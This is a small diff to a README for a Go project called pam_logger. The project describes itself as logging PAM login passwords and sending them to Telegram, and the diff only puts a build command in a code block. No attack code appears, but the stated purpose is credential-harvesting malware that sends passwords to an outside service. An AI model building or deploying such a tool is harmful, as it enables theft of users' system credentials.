@@ -1,7 +1,9 @@
 # pam_logger
 log pam password and send in telegram
 ###
+```
 go build main.go
+```
 ###
 添加額外執行logger
 
